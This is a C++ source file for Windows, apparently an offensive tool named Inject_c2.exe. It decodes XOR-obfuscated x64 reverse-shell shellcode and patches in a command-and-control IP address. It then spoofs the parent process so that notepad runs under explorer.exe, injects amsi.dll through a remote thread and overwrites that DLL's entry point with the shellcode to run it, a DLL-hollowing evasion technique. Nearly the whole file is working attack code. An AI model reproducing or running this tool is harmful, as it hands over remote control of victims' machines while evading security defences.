#include <windows.h>
#include <winbase.h>
#include <stdio.h>
#include <cstring>
#include <cstdlib>
#include <winternl.h>
#include <psapi.h>

char* GetLastErrorAsString(); // Function to get the last error as a string

int main(int args, char *argc[]) // argc is an array of char pointers, args is the number of arguments
{
    char c2_ip_str[16] = {}; // 16 bytes for the IP address
    int ppid = 4752; // 4752 is the PID of explorer.exe
    char dllInjectName[0x50] = {0}; // 0x50 bytes for the dll name
    DWORD c2_ip = 0; // 4 bytes for the IP address

    if (args != 4)
    {
        printf("Usage:: Inject_c2.exe <c2 ip> <parent id> <dllName>\n"); // Print usage
        memcpy(c2_ip_str, "192.168.49.115",15); // Default IP address
        memcpy(dllInjectName, "amsi.dll", 9); // Default dll name
    }
    else
    {
        memcpy(c2_ip_str, argc[1], 15); // Copy the IP address from the command line
        ppid = atoi(argc[2]); // Convert the parent PID from a string to an int
        memcpy(dllInjectName, argc[3], strlen(argc[3])); // Copy the dll name from the command line
        
    }
    printf("C2 IP = %s, ppid = %d, dllName = %s\n", c2_ip_str, ppid, dllInjectName ); // Print out the IP address, parent PID, and dll name
    c2_ip = inet_addr(c2_ip_str); // Convert the IP address from a string to an int

/*****************************************/
//   Begin Shellcode deobfuscation
/*****************************************/

    // XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP 
    char encoded[] = "\xC9\xD1\x62\xD1\x69\x9\xF5\x99\xE1\x35\xD8\xB0\x74\xC9\xB3\x64\xCF\xA9\x4\x4B\x84\x7D\x12\xB3\x55\xD1\x6A\x67\x81\xA9\xBE\xCB\xC1\x7D\x12\x93\x65\xD1\xEE\x82\xD3\xAB\x78\xA8\x28\x7D\xA8\x21\x99\xA5\x80\x49\x9B\xCD\x15\xD8\x20\xFC\x94\xA0\x34\x58\x3\xD8\xCB\xA0\x64\xD1\x6A\x67\xB9\x6A\x77\xA5\xA9\x34\x49\x6A\xB5\x11\xE1\x35\x99\xA9\xB0\x59\x95\x52\xD1\xE0\xE5\xC9\x6A\x7D\x81\xA5\xBE\xD9\xC1\x7C\x98\x31\xD6\xCF\xA9\xCA\x50\xA0\xBE\xAD\x69\x7D\x98\x37\x78\xA8\x28\x7D\xA8\x21\x99\xD8\x20\xFC\x94\xA0\x34\x58\xD9\xD5\xEC\x10\x79\x9A\xAD\x11\x91\xA4\xC\x48\x94\xED\xC1\xA5\xBE\xD9\xC5\x7C\x98\x31\x53\xD8\x6A\x39\xD1\xA5\xBE\xD9\xFD\x7C\x98\x31\x74\x12\xE5\xBD\xD1\xE0\xE5\xD8\xB9\x74\xC1\xBF\x6C\xC3\xA0\x6D\xD8\xB8\x74\xC3\xA9\xB6\x75\xC1\x74\xCB\x1E\xD5\xC1\xA0\x6C\xC3\xA9\xBE\x8B\x8\x62\x66\x1E\xCA\xC4\xA8\x8B\xEE\x92\x7\xC6\xD2\x7\x99\xE1\x74\xCF\xA8\xBC\x7F\xA9\xB4\x75\x41\x34\x99\xE1\x7C\x10\x4\x7C\x25\xE3\x35\x88\xBD\xF5\x31\x29\xE9\xD8\xB5\x7C\x10\x5\x79\x10\x10\x74\x23\xAD\x42\xBF\xE6\xCA\x4C\xAD\xBC\x73\x89\x34\x98\xE1\x35\xC0\xA0\x8F\xB0\x61\x5E\x99\x1E\xE0\xC9\xB1\x78\xA8\x28\x78\xA8\x21\x7D\x66\x21\x7D\x10\x23\x7D\x66\x21\x7D\x10\x20\x74\x23\xB\x3A\x46\x1\xCA\x4C\xA9\xBC\x5E\x8B\x25\xD8\xB9\x79\x10\x3\x7D\x10\x18\x74\x23\x78\x90\xED\x80\xCA\x4C\xA9\xB4\x5D\xA1\x37\x99\xE1\x7C\x21\x82\x58\xFD\xE1\x35\x99\xE1\x35\xD8\xB1\x74\xC9\xA9\xBC\x7B\xB6\x62\xCE\xAC\x4\x59\x8B\x38\xC0\xA0\x65\x7B\x1D\x53\x5E\xA5\x11\xCD\xE0\x34\xD1\x6C\x71\xBD\xF9\xF3\x99\x89\x7D\x10\x7\x63\xC9\xA0\x65\xD8\xB1\x74\xC9\xA8\xCA\x59\xA0\x65\xD0\x1E\xFD\xD4\x68\xF4\xD5\x68\xF4\xD8\x5B\x4C\x55\xDE\xB3\x66\x34\x7D\xA8\x33\x7D\x66\x2B\xBE\x97\xA0\x8F\x91\x66\x28\xF9\x1E\xE0\x22\x11\x80\x3B\xB7\x74\x23\x47\xA0\x24\x7C\xCA\x4C\xA9\xB6\x5D\xC9\x9\x9F\x9D\x3F\x19\x1A\xD5\xEC\xE4\x8E\xDE\xF2\x47\xF6\x8B\x35\xC0\xA0\xBC\x43\x1E\xE0";
    int encoded_size = sizeof(encoded);
    char xor1[] = "\x35\x99\xe1";
    int xor_size = 3;
        
    char *buf = (char*)malloc(encoded_size);
    int base_offset = -1;
    for(int i = 0; i < encoded_size; i++)
    {
        buf[i] = encoded[i]^xor1[i%xor_size];
        if (base_offset == -1 && i > 3 && (buf[i-3]&0xff) == 0xc0 && (buf[i-2]&0xff) == 0xa8 && (buf[i-1]&0xff) == 0xc8 && (buf[i]&0xff) == 0xdc) 
        { 
            base_offset = i-3;
        }
    }
    printf("Found C2 IP at offset at 0x%08x\n", base_offset);
    int *tmp = (int*)&buf[base_offset];
    *tmp = c2_ip;
    for(int i = 0; i < encoded_size; i++)
    {
        printf("\\x%02x", buf[i]);
        if( (i%16) == 0 && i > 0) printf("\n");
    }
/*****************************************/
//    End Shellcode deobfuscation
/*****************************************/


/*****************************************/
// PPID Spoofing
/*****************************************/
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, ppid); // Explorer is where notepad is normally run under

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|DETACHED_PROCESS, NULL, NULL, &si.StartupInfo, &pi);
/*****************************************/
// PPID Spoofing
/*****************************************/
    
/*****************************************/
// DLL Hollowing
/*****************************************/
    HANDLE hDllThread = NULL;
	HMODULE module_array[0x100] = { 0 };
    HMODULE hModule;
    HMODULE hKernel32;
	DWORD module_sz = 0;
	SIZE_T number_of_modules = 0;;
    char moduleName[0x50] = {0};
    void *remoteDLLInjectName = NULL;
	void *remoteProcessMemory = NULL;
	DWORD remoteProcessMemory_sz = 0x1000;
    void *entryPoint = NULL;
    FARPROC loadlibrary_addr = NULL;
	PIMAGE_DOS_HEADER MZ_header = {0};
	PIMAGE_NT_HEADERS PE_header = {0};

    HANDLE hProcess = pi.hProcess; // Get a handle to the process we just created
    // allocate memory, into the remote process memory, for the name of the dll to inject
    remoteDLLInjectName = VirtualAllocEx(hProcess, NULL, sizeof(dllInjectName), MEM_COMMIT, PAGE_READWRITE);  // Allocates memory within the virtual address space of a specified process
	if ( remoteDLLInjectName == NULL ) // If the memory allocation failed, exit
		goto EXIT;

    
    // copy, into the remote process memory, the name of the dll to inject
	WriteProcessMemory(hProcess, remoteDLLInjectName, dllInjectName, sizeof(dllInjectName), NULL); // Writes data to an area of memory in a specified process
    // get the address of LoadLibraryA

	if ((hKernel32 = GetModuleHandleA("Kernel32")) == NULL) // Returns a handle to a module
		goto EXIT;
	
	loadlibrary_addr = GetProcAddress(hKernel32, "LoadLibraryA"); // Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL)

	hDllThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)loadlibrary_addr, remoteDLLInjectName, 0, NULL); // Creates a thread that runs in the virtual address space of another process
    // wait for the thread to finish
	if ( hDllThread != NULL) // If the thread was created successfully
    {
		WaitForSingleObject(hDllThread, 1000); // Waits until the specified object is in the signaled state or the time-out interval elapses

		// Loop through loaded modules lookin for the one we just created
		EnumProcessModules(hProcess, module_array, sizeof(module_array), &module_sz); // Enumerates all the modules in the specified process
		number_of_modules = module_sz / sizeof(HMODULE); // Get the number of modules
        bool bFound = false;

		for (size_t i = 0; i < number_of_modules; i++) 
        {
            hModule = module_array[i]; // Get the module handle
			GetModuleBaseNameA(hProcess, hModule, moduleName, sizeof(moduleName)); // Retrieves the base name of the specified module

			if (strcmp(moduleName, "amsi.dll") == 0) // If the module name is amsi.dll
            {
                bFound = true;
                break;
            }
		}

	}

	// get DLL's AddressOfEntryPoint
    remoteProcessMemory = (void*)VirtualAlloc(NULL, remoteProcessMemory_sz, MEM_COMMIT, PAGE_READWRITE); // Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process
	if (remoteProcessMemory == NULL) // If the memory allocation failed, exit
    {
		goto EXIT;
	}

	ReadProcessMemory(hProcess, hModule, remoteProcessMemory , remoteProcessMemory_sz, NULL); // Reads data from an area of memory in a specified process

	MZ_header = (PIMAGE_DOS_HEADER)remoteProcessMemory;	// Get the DOS header of the DLL
	PE_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)remoteProcessMemory + MZ_header->e_lfanew); //get the PE header of the DLL
	entryPoint = (LPVOID)(PE_header->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hModule); // Get the entrypoint of the DLL
	printf("[*] Dll entryPoint at: %p\n", entryPoint); // Print out the entrypoint of the DLL

	// Overwrite the DLL's entry point with the decoded shellcode
	if (WriteProcessMemory(hProcess, entryPoint, (LPCVOID)buf, encoded_size, NULL)) { // Writes data to an area of memory in a specified process
		// execute shellcode from inside the benign DLL
		CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL); // Creates a thread that runs in the virtual address space of another process
	}

EXIT:
    if (remoteProcessMemory != NULL ) VirtualFree( remoteProcessMemory, remoteProcessMemory_sz, MEM_RELEASE );
	if (pi.hThread != NULL) CloseHandle(pi.hThread);
	if (pi.hProcess != NULL) CloseHandle(pi.hProcess);

}

//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
char* GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if(errorMessageID == 0) {
        return NULL;
    }
    
    LPSTR messageBuffer = NULL;

    //Ask Win32 to give us the string version of that message ID.
    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                 NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
    
    return messageBuffer;;
}
